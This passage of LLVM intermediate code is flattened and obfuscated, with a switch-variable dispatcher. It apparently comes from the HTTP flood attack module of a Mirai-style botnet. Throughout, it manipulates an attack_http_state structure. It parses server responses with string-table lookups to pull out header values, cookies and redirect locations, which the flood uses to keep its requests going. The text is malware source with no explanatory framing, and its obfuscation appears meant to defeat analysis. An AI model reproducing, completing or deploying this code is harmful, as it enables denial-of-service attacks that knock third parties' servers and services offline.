  %1283 = load i32, i32* %38, align 4
  %1284 = sext i32 %1283 to i64
  %1285 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1284
  store i8* %1285, i8** %40, align 8
  %1286 = load i32, i32* %39, align 4
  %1287 = icmp sge i32 %1286, 2
  %1288 = select i1 %1287, i32 -218008199, i32 -317167318
  store i32 %1288, i32* %switchVar
  br label %loopEnd

; <label>:1289:                                   ; preds = %loopEntry
  %1290 = load i32, i32* %39, align 4
  %1291 = sub nsw i32 %1290, 2
  store i32 %1291, i32* %39, align 4
  store i32 -317167318, i32* %switchVar
  br label %loopEnd

; <label>:1292:                                   ; preds = %loopEntry
  %1293 = load i32, i32* %38, align 4
  %1294 = load i32, i32* %39, align 4
  %1295 = add nsw i32 %1293, %1294
  %1296 = sext i32 %1295 to i64
  %1297 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1296
  store i8 0, i8* %1297, align 1
  %1298 = load i8*, i8** %40, align 8
  %1299 = load i8*, i8** %40, align 8
  %1300 = call i32 @util_strlen(i8* %1299)
  %1301 = call i8* @table_retrieve_val(i32 68, i32* null)
  %1302 = call i32 @util_stristr(i8* %1298, i32 %1300, i8* %1301)
  %1303 = icmp ne i32 %1302, 0
  %1304 = select i1 %1303, i32 1475751092, i32 -881120316
  store i32 %1304, i32* %switchVar
  br label %loopEnd

; <label>:1305:                                   ; preds = %loopEntry
  %1306 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1307 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1306, i32 0, i32 12
  store i32 1, i32* %1307, align 4
  store i32 -881120316, i32* %switchVar
  br label %loopEnd

; <label>:1308:                                   ; preds = %loopEntry
  store i32 -747713480, i32* %switchVar
  br label %loopEnd

; <label>:1309:                                   ; preds = %loopEntry
  store i32 690243138, i32* %switchVar
  br label %loopEnd

; <label>:1310:                                   ; preds = %loopEntry
  %1311 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1312 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1311, i32 0, i32 13
  store i32 0, i32* %1312, align 4
  %1313 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1314 = load i32, i32* %12, align 4
  %1315 = call i8* @table_retrieve_val(i32 66, i32* null)
  %1316 = call i32 @util_stristr(i8* %1313, i32 %1314, i8* %1315)
  %1317 = icmp ne i32 %1316, -1
  %1318 = select i1 %1317, i32 -430403357, i32 -533150902
  store i32 %1318, i32* %switchVar
  br label %loopEnd

; <label>:1319:                                   ; preds = %loopEntry
  %1320 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1321 = load i32, i32* %12, align 4
  %1322 = call i8* @table_retrieve_val(i32 66, i32* null)
  %1323 = call i32 @util_stristr(i8* %1320, i32 %1321, i8* %1322)
  store i32 %1323, i32* %41, align 4
  %1324 = load i32, i32* %41, align 4
  %1325 = sext i32 %1324 to i64
  %1326 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1325
  %1327 = load i8, i8* %1326, align 1
  %1328 = sext i8 %1327 to i32
  %1329 = icmp eq i32 %1328, 32
  %1330 = select i1 %1329, i32 -364494137, i32 -793991870
  store i32 %1330, i32* %switchVar
  br label %loopEnd

; <label>:1331:                                   ; preds = %loopEntry
  %1332 = load i32, i32* %41, align 4
  %1333 = add nsw i32 %1332, 1
  store i32 %1333, i32* %41, align 4
  store i32 -793991870, i32* %switchVar
  br label %loopEnd

; <label>:1334:                                   ; preds = %loopEntry
  %1335 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1336 = load i32, i32* %41, align 4
  %1337 = sext i32 %1336 to i64
  %1338 = getelementptr inbounds i8, i8* %1335, i64 %1337
  %1339 = load i32, i32* %12, align 4
  %1340 = load i32, i32* %41, align 4
  %1341 = sub nsw i32 %1339, %1340
  %1342 = call i32 @util_memsearch(i8* %1338, i32 %1341, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1342, i32* %42, align 4
  %1343 = load i32, i32* %42, align 4
  %1344 = icmp ne i32 %1343, -1
  %1345 = select i1 %1344, i32 944161676, i32 -984229330
  store i32 %1345, i32* %switchVar
  br label %loopEnd

; <label>:1346:                                   ; preds = %loopEntry
  %1347 = load i32, i32* %41, align 4
  %1348 = sext i32 %1347 to i64
  %1349 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1348
  store i8* %1349, i8** %43, align 8
  %1350 = load i32, i32* %42, align 4
  %1351 = icmp sge i32 %1350, 2
  %1352 = select i1 %1351, i32 -1358432923, i32 1548216844
  store i32 %1352, i32* %switchVar
  br label %loopEnd

; <label>:1353:                                   ; preds = %loopEntry
  %1354 = load i32, i32* %42, align 4
  %1355 = sub nsw i32 %1354, 2
  store i32 %1355, i32* %42, align 4
  store i32 1548216844, i32* %switchVar
  br label %loopEnd

; <label>:1356:                                   ; preds = %loopEntry
  %1357 = load i32, i32* %41, align 4
  %1358 = load i32, i32* %42, align 4
  %1359 = add nsw i32 %1357, %1358
  %1360 = sext i32 %1359 to i64
  %1361 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1360
  store i8 0, i8* %1361, align 1
  %1362 = load i8*, i8** %43, align 8
  %1363 = load i8*, i8** %43, align 8
  %1364 = call i32 @util_strlen(i8* %1363)
  %1365 = call i8* @table_retrieve_val(i32 67, i32* null)
  %1366 = call i32 @util_stristr(i8* %1362, i32 %1364, i8* %1365)
  %1367 = icmp ne i32 %1366, 0
  %1368 = select i1 %1367, i32 313777995, i32 1924511005
  store i32 %1368, i32* %switchVar
  br label %loopEnd

; <label>:1369:                                   ; preds = %loopEntry
  %1370 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1371 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1370, i32 0, i32 13
  store i32 1, i32* %1371, align 4
  store i32 1924511005, i32* %switchVar
  br label %loopEnd

; <label>:1372:                                   ; preds = %loopEntry
  store i32 -984229330, i32* %switchVar
  br label %loopEnd

; <label>:1373:                                   ; preds = %loopEntry
  store i32 -533150902, i32* %switchVar
  br label %loopEnd

; <label>:1374:                                   ; preds = %loopEntry
  %1375 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1376 = load i32, i32* %12, align 4
  %1377 = call i8* @table_retrieve_val(i32 65, i32* null)
  %1378 = call i32 @util_stristr(i8* %1375, i32 %1376, i8* %1377)
  %1379 = icmp ne i32 %1378, -1
  %1380 = select i1 %1379, i32 294634101, i32 434336244
  store i32 %1380, i32* %switchVar
  br label %loopEnd

; <label>:1381:                                   ; preds = %loopEntry
  %1382 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1383 = load i32, i32* %12, align 4
  %1384 = call i8* @table_retrieve_val(i32 65, i32* null)
  %1385 = call i32 @util_stristr(i8* %1382, i32 %1383, i8* %1384)
  store i32 %1385, i32* %44, align 4
  %1386 = load i32, i32* %44, align 4
  %1387 = sext i32 %1386 to i64
  %1388 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1387
  %1389 = load i8, i8* %1388, align 1
  %1390 = sext i8 %1389 to i32
  %1391 = icmp eq i32 %1390, 32
  %1392 = select i1 %1391, i32 -2085121441, i32 -599857019
  store i32 %1392, i32* %switchVar
  br label %loopEnd

; <label>:1393:                                   ; preds = %loopEntry
  %1394 = load i32, i32* %44, align 4
  %1395 = add nsw i32 %1394, 1
  store i32 %1395, i32* %44, align 4
  store i32 -599857019, i32* %switchVar
  br label %loopEnd

; <label>:1396:                                   ; preds = %loopEntry
  %1397 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1398 = load i32, i32* %44, align 4
  %1399 = sext i32 %1398 to i64
  %1400 = getelementptr inbounds i8, i8* %1397, i64 %1399
  %1401 = load i32, i32* %12, align 4
  %1402 = load i32, i32* %44, align 4
  %1403 = sub nsw i32 %1401, %1402
  %1404 = call i32 @util_memsearch(i8* %1400, i32 %1403, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1404, i32* %45, align 4
  %1405 = load i32, i32* %45, align 4
  %1406 = icmp ne i32 %1405, -1
  %1407 = select i1 %1406, i32 -1266865958, i32 -966184340
  store i32 %1407, i32* %switchVar
  br label %loopEnd

; <label>:1408:                                   ; preds = %loopEntry
  %1409 = load i32, i32* %44, align 4
  %1410 = sext i32 %1409 to i64
  %1411 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1410
  store i8* %1411, i8** %46, align 8
  %1412 = load i32, i32* %45, align 4
  %1413 = icmp sge i32 %1412, 2
  %1414 = select i1 %1413, i32 -1124054143, i32 -1665445276
  store i32 %1414, i32* %switchVar
  br label %loopEnd

; <label>:1415:                                   ; preds = %loopEntry
  %1416 = load i32, i32* %45, align 4
  %1417 = sub nsw i32 %1416, 2
  store i32 %1417, i32* %45, align 4
  store i32 -1665445276, i32* %switchVar
  br label %loopEnd

; <label>:1418:                                   ; preds = %loopEntry
  %1419 = load i32, i32* %44, align 4
  %1420 = load i32, i32* %45, align 4
  %1421 = add nsw i32 %1419, %1420
  %1422 = sext i32 %1421 to i64
  %1423 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1422
  store i8 0, i8* %1423, align 1
  %1424 = load i8*, i8** %46, align 8
  %1425 = call i32 @util_atoi(i8* %1424, i32 10)
  %1426 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1427 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1426, i32 0, i32 14
  store i32 %1425, i32* %1427, align 4
  store i32 -966184340, i32* %switchVar
  br label %loopEnd

; <label>:1428:                                   ; preds = %loopEntry
  store i32 2123579761, i32* %switchVar
  br label %loopEnd

; <label>:1429:                                   ; preds = %loopEntry
  %1430 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1431 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1430, i32 0, i32 14
  store i32 0, i32* %1431, align 4
  store i32 2123579761, i32* %switchVar
  br label %loopEnd

; <label>:1432:                                   ; preds = %loopEntry
  store i32 0, i32* %37, align 4
  store i32 -695099799, i32* %switchVar
  br label %loopEnd

; <label>:1433:                                   ; preds = %loopEntry
  %1434 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1435 = load i32, i32* %37, align 4
  %1436 = sext i32 %1435 to i64
  %1437 = getelementptr inbounds i8, i8* %1434, i64 %1436
  %1438 = load i32, i32* %12, align 4
  %1439 = call i8* @table_retrieve_val(i32 64, i32* null)
  %1440 = call i32 @util_stristr(i8* %1437, i32 %1438, i8* %1439)
  %1441 = icmp ne i32 %1440, -1
  %1442 = select i1 %1441, i32 -645675748, i32 -1115900379
  store i32 %1442, i32* %switchVar
  store i1 false, i1* %.reg2mem47
  br label %loopEnd

; <label>:1443:                                   ; preds = %loopEntry
  %1444 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1445 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1444, i32 0, i32 15
  %1446 = load i32, i32* %1445, align 4
  %1447 = icmp slt i32 %1446, 5
  store i32 -1115900379, i32* %switchVar
  store i1 %1447, i1* %.reg2mem47
  br label %loopEnd

; <label>:1448:                                   ; preds = %loopEntry
  %.reload48 = load i1, i1* %.reg2mem47
  %1449 = select i1 %.reload48, i32 -831094257, i32 1275777672
  store i32 %1449, i32* %switchVar
  br label %loopEnd

; <label>:1450:                                   ; preds = %loopEntry
  %1451 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1452 = load i32, i32* %37, align 4
  %1453 = sext i32 %1452 to i64
  %1454 = getelementptr inbounds i8, i8* %1451, i64 %1453
  %1455 = load i32, i32* %12, align 4
  %1456 = call i8* @table_retrieve_val(i32 64, i32* null)
  %1457 = call i32 @util_stristr(i8* %1454, i32 %1455, i8* %1456)
  store i32 %1457, i32* %47, align 4
  %1458 = load i32, i32* %37, align 4
  %1459 = load i32, i32* %47, align 4
  %1460 = add nsw i32 %1458, %1459
  %1461 = sext i32 %1460 to i64
  %1462 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1461
  %1463 = load i8, i8* %1462, align 1
  %1464 = sext i8 %1463 to i32
  %1465 = icmp eq i32 %1464, 32
  %1466 = select i1 %1465, i32 -1810333682, i32 -1312806826
  store i32 %1466, i32* %switchVar
  br label %loopEnd

; <label>:1467:                                   ; preds = %loopEntry
  %1468 = load i32, i32* %47, align 4
  %1469 = add nsw i32 %1468, 1
  store i32 %1469, i32* %47, align 4
  store i32 -1312806826, i32* %switchVar
  br label %loopEnd

; <label>:1470:                                   ; preds = %loopEntry
  %1471 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1472 = load i32, i32* %37, align 4
  %1473 = sext i32 %1472 to i64
  %1474 = getelementptr inbounds i8, i8* %1471, i64 %1473
  %1475 = load i32, i32* %47, align 4
  %1476 = sext i32 %1475 to i64
  %1477 = getelementptr inbounds i8, i8* %1474, i64 %1476
  %1478 = load i32, i32* %12, align 4
  %1479 = load i32, i32* %37, align 4
  %1480 = sub nsw i32 %1478, %1479
  %1481 = load i32, i32* %47, align 4
  %1482 = sub nsw i32 %1480, %1481
  %1483 = call i32 @util_memsearch(i8* %1477, i32 %1482, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1483, i32* %48, align 4
  %1484 = load i32, i32* %48, align 4
  %1485 = icmp ne i32 %1484, -1
  %1486 = select i1 %1485, i32 -1815726169, i32 -757521021
  store i32 %1486, i32* %switchVar
  br label %loopEnd

; <label>:1487:                                   ; preds = %loopEntry
  %1488 = load i32, i32* %37, align 4
  %1489 = load i32, i32* %47, align 4
  %1490 = add nsw i32 %1488, %1489
  %1491 = sext i32 %1490 to i64
  %1492 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1491
  store i8* %1492, i8** %49, align 8
  %1493 = load i32, i32* %48, align 4
  %1494 = icmp sge i32 %1493, 2
  %1495 = select i1 %1494, i32 -336723000, i32 -288420209
  store i32 %1495, i32* %switchVar
  br label %loopEnd

; <label>:1496:                                   ; preds = %loopEntry
  %1497 = load i32, i32* %48, align 4
  %1498 = sub nsw i32 %1497, 2
  store i32 %1498, i32* %48, align 4
  store i32 -288420209, i32* %switchVar
  br label %loopEnd

; <label>:1499:                                   ; preds = %loopEntry
  %1500 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1501 = load i32, i32* %37, align 4
  %1502 = sext i32 %1501 to i64
  %1503 = getelementptr inbounds i8, i8* %1500, i64 %1502
  %1504 = load i32, i32* %47, align 4
  %1505 = sext i32 %1504 to i64
  %1506 = getelementptr inbounds i8, i8* %1503, i64 %1505
  %1507 = load i32, i32* %12, align 4
  %1508 = load i32, i32* %37, align 4
  %1509 = sub nsw i32 %1507, %1508
  %1510 = load i32, i32* %47, align 4
  %1511 = sub nsw i32 %1509, %1510
  %1512 = call i32 @util_memsearch(i8* %1506, i32 %1511, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %1513 = icmp sgt i32 %1512, 0
  %1514 = select i1 %1513, i32 1932492653, i32 -976006613
  store i32 %1514, i32* %switchVar
  br label %loopEnd

; <label>:1515:                                   ; preds = %loopEntry
  %1516 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1517 = load i32, i32* %37, align 4
  %1518 = sext i32 %1517 to i64
  %1519 = getelementptr inbounds i8, i8* %1516, i64 %1518
  %1520 = load i32, i32* %47, align 4
  %1521 = sext i32 %1520 to i64
  %1522 = getelementptr inbounds i8, i8* %1519, i64 %1521
  %1523 = load i32, i32* %12, align 4
  %1524 = load i32, i32* %37, align 4
  %1525 = sub nsw i32 %1523, %1524
  %1526 = load i32, i32* %47, align 4
  %1527 = sub nsw i32 %1525, %1526
  %1528 = call i32 @util_memsearch(i8* %1522, i32 %1527, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %1529 = sub nsw i32 %1528, 1
  store i32 %1529, i32* %48, align 4
  store i32 -976006613, i32* %switchVar
  br label %loopEnd

; <label>:1530:                                   ; preds = %loopEntry
  %1531 = load i32, i32* %37, align 4
  %1532 = load i32, i32* %47, align 4
  %1533 = add nsw i32 %1531, %1532
  %1534 = load i32, i32* %48, align 4
  %1535 = add nsw i32 %1533, %1534
  %1536 = sext i32 %1535 to i64
  %1537 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1536
  store i8 0, i8* %1537, align 1
  store i32 0, i32* %10, align 4
  store i32 -1044487512, i32* %switchVar
  br label %loopEnd

; <label>:1538:                                   ; preds = %loopEntry
  %1539 = load i32, i32* %10, align 4
  %1540 = load i8*, i8** %49, align 8
  %1541 = call i32 @util_strlen(i8* %1540)
  %1542 = icmp slt i32 %1539, %1541
  %1543 = select i1 %1542, i32 663845591, i32 342178513
  store i32 %1543, i32* %switchVar
  br label %loopEnd

; <label>:1544:                                   ; preds = %loopEntry
  %1545 = load i8*, i8** %49, align 8
  %1546 = load i32, i32* %10, align 4
  %1547 = sext i32 %1546 to i64
  %1548 = getelementptr inbounds i8, i8* %1545, i64 %1547
  %1549 = load i8, i8* %1548, align 1
  %1550 = sext i8 %1549 to i32
  %1551 = icmp eq i32 %1550, 61
  %1552 = select i1 %1551, i32 -42401461, i32 1978767480
  store i32 %1552, i32* %switchVar
  br label %loopEnd

; <label>:1553:                                   ; preds = %loopEntry
  store i32 342178513, i32* %switchVar
  br label %loopEnd

; <label>:1554:                                   ; preds = %loopEntry
  store i32 -1921350302, i32* %switchVar
  br label %loopEnd

; <label>:1555:                                   ; preds = %loopEntry
  %1556 = load i32, i32* %10, align 4
  %1557 = add nsw i32 %1556, 1
  store i32 %1557, i32* %10, align 4
  store i32 -1044487512, i32* %switchVar
  br label %loopEnd

; <label>:1558:                                   ; preds = %loopEntry
  %1559 = load i8*, i8** %49, align 8
  %1560 = load i32, i32* %10, align 4
  %1561 = sext i32 %1560 to i64
  %1562 = getelementptr inbounds i8, i8* %1559, i64 %1561
  %1563 = load i8, i8* %1562, align 1
  %1564 = sext i8 %1563 to i32
  %1565 = icmp eq i32 %1564, 61
  %1566 = select i1 %1565, i32 651719498, i32 -1152529623
  store i32 %1566, i32* %switchVar
  br label %loopEnd

; <label>:1567:                                   ; preds = %loopEntry
  %1568 = load i32, i32* %10, align 4
  store i32 %1568, i32* %50, align 4
  store i32 0, i32* %51, align 4
  store i32 0, i32* %10, align 4
  store i32 -1935987597, i32* %switchVar
  br label %loopEnd

; <label>:1569:                                   ; preds = %loopEntry
  %1570 = load i32, i32* %10, align 4
  %1571 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1572 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1571, i32 0, i32 15
  %1573 = load i32, i32* %1572, align 4
  %1574 = icmp slt i32 %1570, %1573
  %1575 = select i1 %1574, i32 -2056374296, i32 -1504313461
  store i32 %1575, i32* %switchVar
  br label %loopEnd

; <label>:1576:                                   ; preds = %loopEntry
  %1577 = load i8*, i8** %49, align 8
  %1578 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1579 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1578, i32 0, i32 16
  %1580 = load i32, i32* %10, align 4
  %1581 = sext i32 %1580 to i64
  %1582 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %1579, i64 0, i64 %1581
  %1583 = getelementptr inbounds [128 x i8], [128 x i8]* %1582, i32 0, i32 0
  %1584 = load i32, i32* %50, align 4
  %1585 = call signext i8 @util_strncmp(i8* %1577, i8* %1583, i32 %1584)
  %1586 = icmp ne i8 %1585, 0
  %1587 = select i1 %1586, i32 -69426390, i32 -1317372390
  store i32 %1587, i32* %switchVar
  br label %loopEnd

; <label>:1588:                                   ; preds = %loopEntry
  store i32 1, i32* %51, align 4
  store i32 -1504313461, i32* %switchVar
  br label %loopEnd

; <label>:1589:                                   ; preds = %loopEntry
  store i32 -119683647, i32* %switchVar
  br label %loopEnd

; <label>:1590:                                   ; preds = %loopEntry
  %1591 = load i32, i32* %10, align 4
  %1592 = add nsw i32 %1591, 1
  store i32 %1592, i32* %10, align 4
  store i32 -1935987597, i32* %switchVar
  br label %loopEnd

; <label>:1593:                                   ; preds = %loopEntry
  %1594 = load i32, i32* %51, align 4
  %1595 = icmp ne i32 %1594, 0
  %1596 = select i1 %1595, i32 -2007064262, i32 1802665838
  store i32 %1596, i32* %switchVar
  br label %loopEnd

; <label>:1597:                                   ; preds = %loopEntry
  %1598 = load i8*, i8** %49, align 8
  %1599 = call i32 @util_strlen(i8* %1598)
  %1600 = icmp slt i32 %1599, 128
  %1601 = select i1 %1600, i32 -1458408458, i32 -1632807598
  store i32 %1601, i32* %switchVar
  br label %loopEnd

; <label>:1602:                                   ; preds = %loopEntry
  %1603 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1604 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1603, i32 0, i32 16
  %1605 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1606 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1605, i32 0, i32 15
  %1607 = load i32, i32* %1606, align 4
  %1608 = sext i32 %1607 to i64
  %1609 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %1604, i64 0, i64 %1608
  %1610 = getelementptr inbounds [128 x i8], [128 x i8]* %1609, i32 0, i32 0
  %1611 = load i8*, i8** %49, align 8
  %1612 = call i32 @util_strcpy(i8* %1610, i8* %1611)
  %1613 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1614 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1613, i32 0, i32 15
  %1615 = load i32, i32* %1614, align 4
  %1616 = add nsw i32 %1615, 1
  store i32 %1616, i32* %1614, align 4
  store i32 -1632807598, i32* %switchVar
  br label %loopEnd

; <label>:1617:                                   ; preds = %loopEntry
  store i32 -2007064262, i32* %switchVar
  br label %loopEnd

; <label>:1618:                                   ; preds = %loopEntry
  store i32 -1152529623, i32* %switchVar
  br label %loopEnd

; <label>:1619:                                   ; preds = %loopEntry
  store i32 -757521021, i32* %switchVar
  br label %loopEnd

; <label>:1620:                                   ; preds = %loopEntry
  %1621 = load i32, i32* %47, align 4
  %1622 = load i32, i32* %37, align 4
  %1623 = add nsw i32 %1622, %1621
  store i32 %1623, i32* %37, align 4
  store i32 -695099799, i32* %switchVar
  br label %loopEnd

; <label>:1624:                                   ; preds = %loopEntry
  %1625 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1626 = load i32, i32* %12, align 4
  %1627 = call i8* @table_retrieve_val(i32 63, i32* null)
  %1628 = call i32 @util_stristr(i8* %1625, i32 %1626, i8* %1627)
  %1629 = icmp ne i32 %1628, -1
  %1630 = select i1 %1629, i32 173041220, i32 -1423284505
  store i32 %1630, i32* %switchVar
  br label %loopEnd

; <label>:1631:                                   ; preds = %loopEntry
  %1632 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1633 = load i32, i32* %12, align 4
  %1634 = call i8* @table_retrieve_val(i32 63, i32* null)
  %1635 = call i32 @util_stristr(i8* %1632, i32 %1633, i8* %1634)
  store i32 %1635, i32* %52, align 4
  %1636 = load i32, i32* %52, align 4
  %1637 = sext i32 %1636 to i64
  %1638 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1637
  %1639 = load i8, i8* %1638, align 1
  %1640 = sext i8 %1639 to i32
  %1641 = icmp eq i32 %1640, 32
  %1642 = select i1 %1641, i32 472731380, i32 452485542
  store i32 %1642, i32* %switchVar
  br label %loopEnd

; <label>:1643:                                   ; preds = %loopEntry
  %1644 = load i32, i32* %52, align 4
  %1645 = add nsw i32 %1644, 1
  store i32 %1645, i32* %52, align 4
  store i32 452485542, i32* %switchVar
  br label %loopEnd

; <label>:1646:                                   ; preds = %loopEntry
  %1647 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1648 = load i32, i32* %52, align 4
  %1649 = sext i32 %1648 to i64
  %1650 = getelementptr inbounds i8, i8* %1647, i64 %1649
  %1651 = load i32, i32* %12, align 4
  %1652 = load i32, i32* %52, align 4
  %1653 = sub nsw i32 %1651, %1652
  %1654 = call i32 @util_memsearch(i8* %1650, i32 %1653, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1654, i32* %53, align 4
  %1655 = load i32, i32* %53, align 4
  %1656 = icmp ne i32 %1655, -1
  %1657 = select i1 %1656, i32 1895949170, i32 -1282165818
  store i32 %1657, i32* %switchVar
  br label %loopEnd

; <label>:1658:                                   ; preds = %loopEntry
  %1659 = load i32, i32* %52, align 4
  %1660 = sext i32 %1659 to i64
  %1661 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1660
  store i8* %1661, i8** %54, align 8
  %1662 = load i32, i32* %53, align 4
  %1663 = icmp sge i32 %1662, 2
  %1664 = select i1 %1663, i32 1718490586, i32 -174004450
  store i32 %1664, i32* %switchVar
  br label %loopEnd

; <label>:1665:                                   ; preds = %loopEntry
  %1666 = load i32, i32* %53, align 4
  %1667 = sub nsw i32 %1666, 2
  store i32 %1667, i32* %53, align 4
  store i32 -174004450, i32* %switchVar
  br label %loopEnd

; <label>:1668:                                   ; preds = %loopEntry
  %1669 = load i32, i32* %52, align 4
  %1670 = load i32, i32* %53, align 4
  %1671 = add nsw i32 %1669, %1670
  %1672 = sext i32 %1671 to i64
  %1673 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1672
  store i8 0, i8* %1673, align 1
  %1674 = load i32, i32* %53, align 4
  %1675 = add nsw i32 %1674, 1
  store i32 %1675, i32* %53, align 4
  %1676 = load i8*, i8** %54, align 8
  %1677 = load i32, i32* %53, align 4
  %1678 = call i32 @util_memsearch(i8* %1676, i32 %1677, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i32 0, i32 0), i32 4)
  %1679 = icmp eq i32 %1678, 4
  %1680 = select i1 %1679, i32 -2065668179, i32 -1856529971
  store i32 %1680, i32* %switchVar
  br label %loopEnd

; <label>:1681:                                   ; preds = %loopEntry
  store i32 7, i32* %10, align 4
  %1682 = load i8*, i8** %54, align 8
  %1683 = getelementptr inbounds i8, i8* %1682, i64 4
  %1684 = load i8, i8* %1683, align 1
  %1685 = sext i8 %1684 to i32
  %1686 = icmp eq i32 %1685, 115
  %1687 = select i1 %1686, i32 -1374530649, i32 -1152569666
  store i32 %1687, i32* %switchVar
  br label %loopEnd

; <label>:1688:                                   ; preds = %loopEntry
  %1689 = load i32, i32* %10, align 4
  %1690 = add nsw i32 %1689, 1
  store i32 %1690, i32* %10, align 4
  store i32 -1152569666, i32* %switchVar
  br label %loopEnd

; <label>:1691:                                   ; preds = %loopEntry
  %1692 = load i8*, i8** %54, align 8
  %1693 = load i8*, i8** %54, align 8
  %1694 = load i32, i32* %10, align 4
  %1695 = sext i32 %1694 to i64
  %1696 = getelementptr inbounds i8, i8* %1693, i64 %1695
  %1697 = load i32, i32* %53, align 4
  %1698 = load i32, i32* %10, align 4
  %1699 = sub nsw i32 %1697, %1698
  %1700 = sext i32 %1699 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %1692, i8* %1696, i64 %1700, i32 1, i1 false)
  store i32 0, i32* %10, align 4
  store i32 1669737036, i32* %switchVar
  br label %loopEnd

; <label>:1701:                                   ; preds = %loopEntry
  %1702 = load i8*, i8** %54, align 8
  %1703 = load i32, i32* %10, align 4
  %1704 = sext i32 %1703 to i64
  %1705 = getelementptr inbounds i8, i8* %1702, i64 %1704
  %1706 = load i8, i8* %1705, align 1
  %1707 = sext i8 %1706 to i32
  %1708 = icmp ne i32 %1707, 0
  %1709 = select i1 %1708, i32 -1877207664, i32 837122827
  store i32 %1709, i32* %switchVar
  br label %loopEnd

; <label>:1710:                                   ; preds = %loopEntry
  %1711 = load i8*, i8** %54, align 8
  %1712 = load i32, i32* %10, align 4
  %1713 = sext i32 %1712 to i64
  %1714 = getelementptr inbounds i8, i8* %1711, i64 %1713
  %1715 = load i8, i8* %1714, align 1
  %1716 = sext i8 %1715 to i32
  %1717 = icmp eq i32 %1716, 47
  %1718 = select i1 %1717, i32 534886424, i32 -837551856
  store i32 %1718, i32* %switchVar
  br label %loopEnd

; <label>:1719:                                   ; preds = %loopEntry
  %1720 = load i8*, i8** %54, align 8
  %1721 = load i32, i32* %10, align 4
  %1722 = sext i32 %1721 to i64
  %1723 = getelementptr inbounds i8, i8* %1720, i64 %1722
  store i8 0, i8* %1723, align 1
  store i32 837122827, i32* %switchVar
  br label %loopEnd

; <label>:1724:                                   ; preds = %loopEntry
  %1725 = load i32, i32* %10, align 4
  %1726 = add nsw i32 %1725, 1
  store i32 %1726, i32* %10, align 4
  store i32 1669737036, i32* %switchVar
  br label %loopEnd

; <label>:1727:                                   ; preds = %loopEntry
  %1728 = load i8*, i8** %54, align 8
  %1729 = call i32 @util_strlen(i8* %1728)
  %1730 = icmp sgt i32 %1729, 0
